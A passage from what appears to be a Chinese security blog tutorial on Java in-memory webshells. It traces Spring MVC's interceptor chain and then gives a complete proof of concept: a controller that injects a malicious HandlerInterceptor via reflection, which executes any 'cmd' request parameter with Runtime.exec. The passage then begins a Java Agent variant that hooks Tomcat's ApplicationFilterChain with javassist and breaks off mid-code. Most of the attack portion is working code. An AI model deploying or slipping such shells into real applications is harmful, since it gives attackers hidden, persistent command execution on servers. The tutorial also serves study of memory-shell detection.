(org.springframework.web.servlet)<br>doGet:<span class="hljs-number">898</span>, FrameworkServlet (org.springframework.web.servlet)<br>service:<span class="hljs-number">655</span>, HttpServlet (javax.servlet.http)<br>service:<span class="hljs-number">883</span>, FrameworkServlet (org.springframework.web.servlet)<br>service:<span class="hljs-number">764</span>, HttpServlet (javax.servlet.http)<br>internalDoFilter:<span class="hljs-number">227</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br> <br>...<br></code></pre></td></tr></table></figure><p>跟进到<code>getHandler</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerMappings != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">for</span> (HandlerMapping mapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;<br>            <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> mapping.getHandler(request);<br>            <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> handler;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>getHandler</code> 方法中，会通过遍历 <code>this.handlerMappings</code> 来获取 <code>HandlerMapping</code> 对象实例 <code>mapping</code></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-65.png" alt="img49"></p><p>而getHandler实际上会调用<code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类的 <code>getHandler</code> 方法，并通过 <code>getHandlerExecutionChain(handler, request)</code> 方法返回 <code>HandlerExecutionChain</code> 类的实例</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-66.png" alt="img50"></p><p>跟进<code>AbstractHandlerMapping</code>#<code>getHandlerExecutionChain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandlerExecutionChain</span><span class="hljs-params">(Object handler, HttpServletRequest request)</span> &#123;<br><span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> (handler <span class="hljs-keyword">instanceof</span> HandlerExecutionChain ?<br>(HandlerExecutionChain) handler : <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerExecutionChain</span>(handler));<br> <br><span class="hljs-keyword">for</span> (HandlerInterceptor interceptor : <span class="hljs-built_in">this</span>.adaptedInterceptors) &#123;<br><span class="hljs-keyword">if</span> (interceptor <span class="hljs-keyword">instanceof</span> MappedInterceptor) &#123;<br><span class="hljs-type">MappedInterceptor</span> <span class="hljs-variable">mappedInterceptor</span> <span class="hljs-operator">=</span> (MappedInterceptor) interceptor;<br><span class="hljs-keyword">if</span> (mappedInterceptor.matches(request)) &#123;<br>chain.addInterceptor(mappedInterceptor.getInterceptor());<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>chain.addInterceptor(interceptor);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> chain;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到其通过<code>adaptedInterceptors</code>获取所有Interceptor后进行遍历，其中可以看见一个我们自己定义的Interceptor</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-67.png" alt="img51"></p><p>然后通过<code>chain.addInterceptor()</code>将所有Interceptor添加到<code>HandlerExecutionChain</code>中。最后返回到<code>DispatcherServlet#doDispatch()</code>中，调用<code>mappedHandler.applyPreHandle</code>方法</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-68.png" alt="img52"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-title function_">applyPreHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.interceptorList.size(); i++) &#123;<br><span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorList.get(i);<br><span class="hljs-keyword">if</span> (!interceptor.preHandle(request, response, <span class="hljs-built_in">this</span>.handler)) &#123;<br>triggerAfterCompletion(request, response, <span class="hljs-literal">null</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-built_in">this</span>.interceptorIndex = i;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后遍历调用Interceptor中的<code>preHandle()</code>拦截方法。</p><p>因此当一个Request发送到Spring应用时，大致会经过如下几个层面才会进入Controller层</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Controller<br></code></pre></td></tr></table></figure><h4 id="Interceptor型内存马实现思路"><a href="#Interceptor型内存马实现思路" class="headerlink" title="Interceptor型内存马实现思路"></a>Interceptor型内存马实现思路</h4><p>通过以上分析，Interceptor实际上是可以拦截所有想到达Controller的请求的。下面的问题就是如何动态地注册一个恶意的Interceptor了。由于Interceptor和Filter有一定的相似之处，因此我们可以仿照Filter型内存马的实现思路</p><ul><li>获取当前运行环境的上下文</li><li>实现恶意Interceptor</li><li>注入恶意Interceptor</li></ul><h4 id="获取环境上下文"><a href="#获取环境上下文" class="headerlink" title="获取环境上下文"></a>获取环境上下文</h4><p>在Controller型内存马中，给出了四种获取Spring上下文<code>ApplicationContext</code>的方法。下面我们还可以通过反射获取<code>LiveBeansView</code>类的<code>applicationContexts</code> 属性来获取上下文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span><br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br><span class="hljs-comment">// 2. 属性被 private 修饰，所以 setAccessible true</span><br>filed.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 3. 获取一个 ApplicationContext 实例</span><br>org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br></code></pre></td></tr></table></figure><p><code>org.springframework.context.support.LiveBeansView</code> 类在 <code>spring-context</code> <strong>3.2.x</strong> 版本（现在最新版本是 <strong>5.3.x</strong>）才加入其中，所以比较低版本的 spring 无法通过此方法获得 <code>ApplicationContext</code> 的实例。</p><h4 id="获取adaptedInterceptors属性值"><a href="#获取adaptedInterceptors属性值" class="headerlink" title="获取adaptedInterceptors属性值"></a>获取adaptedInterceptors属性值</h4><p>获得 <code>ApplicationContext</code> 实例后，还需要知道 <code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类实例的 bean name 叫什么。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-69.png" alt="img53"></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-70.png" alt="54"></p><p>我们可以通过<code>ApplicationContext</code>上下文来获取<code>AbstractHandlerMapping</code>，进而反射获取<code>adaptedInterceptors</code>属性值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>);<br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br>java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);<br></code></pre></td></tr></table></figure><h4 id="实现恶意Interceptor"><a href="#实现恶意Interceptor" class="headerlink" title="实现恶意Interceptor"></a>实现恶意Interceptor</h4><p>这里选择继承HandlerInterceptor类，并重写其preHandle方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Interceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="动态注册Interceptor"><a href="#动态注册Interceptor" class="headerlink" title="动态注册Interceptor"></a>动态注册Interceptor</h4><p>我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 <code>adaptedInterceptors</code> 属性值中就可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将恶意Interceptor添加入adaptedInterceptors</span><br><span class="hljs-type">Shell_Interceptor</span> <span class="hljs-variable">shell_interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Interceptor</span>();<br>adaptedInterceptors.add(shell_interceptor);<br></code></pre></td></tr></table></figure><h4 id="完整POC-5"><a href="#完整POC-5" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"> <br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject_Shell_Interceptor_Controller</span> &#123;<br> <br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/inject&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Inject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br> <br>        <span class="hljs-comment">//获取上下文环境</span><br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());<br> <br>        <span class="hljs-comment">//获取adaptedInterceptors属性值</span><br>        org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);<br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);<br> <br> <br>        <span class="hljs-comment">//将恶意Interceptor添加入adaptedInterceptors</span><br>        <span class="hljs-type">Shell_Interceptor</span> <span class="hljs-variable">shell_interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Interceptor</span>();<br>        adaptedInterceptors.add(shell_interceptor);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Interceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问对应路由<code>/inject</code></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-71.png" alt="img55"></p><p>成功执行</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-72.png" alt="img56"></p><h2 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h2><p>有关Java Agent的知识点可以看我之前的一篇文章<a href="https://myloveguoguo.github.io/2023/09/28/Instrument%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF%E6%9D%A5%E5%9F%8BJackrabbit%E7%9A%84%E5%9D%91/">Instrument插桩技术</a>，这里不过多介绍。</p><h3 id="Agent内存马"><a href="#Agent内存马" class="headerlink" title="Agent内存马"></a>Agent内存马</h3><p>现在我们可以通过Java Agent技术来修改正在运行JVM中的方法体，那么我们可以Hook一些JVM一定会调用、并且Hook之后不会影响正常业务逻辑的的方法来实现内存马。</p><p>这里我们以Spring Boot为例，来实现一个Agent内存马</p><h4 id="Spring-Boot中的Tomcat"><a href="#Spring-Boot中的Tomcat" class="headerlink" title="Spring Boot中的Tomcat"></a>Spring Boot中的Tomcat</h4><p>我们知道，Spring Boot中内嵌了一个embed Tomcat作为其启动容器。既然是Tomcat，那肯定有相应的组件容器。我们先来调试一下SpringBoot，部分调用栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">Context:<span class="hljs-number">20</span>, Context_Learn (com.example.spring_controller)<br>...<br>(org.springframework.web.servlet.mvc.method.annotation)<br>handleInternal:<span class="hljs-number">808</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)<br>handle:<span class="hljs-number">87</span>, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)<br>doDispatch:<span class="hljs-number">1067</span>, DispatcherServlet (org.springframework.web.servlet)<br>doService:<span class="hljs-number">963</span>, DispatcherServlet (org.springframework.web.servlet)<br>processRequest:<span class="hljs-number">1006</span>, FrameworkServlet (org.springframework.web.servlet)<br>doGet:<span class="hljs-number">898</span>, FrameworkServlet (org.springframework.web.servlet)<br>service:<span class="hljs-number">655</span>, HttpServlet (javax.servlet.http)<br>service:<span class="hljs-number">883</span>, FrameworkServlet (org.springframework.web.servlet)<br>service:<span class="hljs-number">764</span>, HttpServlet (javax.servlet.http)<br>internalDoFilter:<span class="hljs-number">227</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">53</span>, WsFilter (org.apache.tomcat.websocket.server)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilterInternal:<span class="hljs-number">100</span>, RequestContextFilter (org.springframework.web.filter)<br>doFilter:<span class="hljs-number">117</span>, OncePerRequestFilter (org.springframework.web.filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilterInternal:<span class="hljs-number">93</span>, FormContentFilter (org.springframework.web.filter)<br>doFilter:<span class="hljs-number">117</span>, OncePerRequestFilter (org.springframework.web.filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilterInternal:<span class="hljs-number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)<br>doFilter:<span class="hljs-number">117</span>, OncePerRequestFilter (org.springframework.web.filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>...<br></code></pre></td></tr></table></figure><p>可以看到会按照责任链机制反复调用<code>ApplicationFilterChain#doFilter()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br> <br>        <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.security.AccessController.doPrivileged(<br>                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;<br>                            internalDoFilter(req,res);<br>                            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                        &#125;<br>                );<br>            &#125; ...<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            internalDoFilter(request,response);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟到internalDoFilter()方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">                                  ServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br> <br>        <span class="hljs-comment">// Call the next filter if there is one</span><br>        <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>            ...<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上两个方法均拥有ServletRequest和ServletResponse，并且hook不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用</p><h4 id="利用Java-Agent实现Spring-Filter内存马"><a href="#利用Java-Agent实现Spring-Filter内存马" class="headerlink" title="利用Java Agent实现Spring Filter内存马"></a>利用Java Agent实现Spring Filter内存马</h4><p>我们复用上面的agentmain-Agent，修改字节码的关键在于<code>transformer()</code>方法，因此我们重写该方法即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br> <br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Filter_Transform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br> <br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br> <br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br> <br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br> <br>            <span 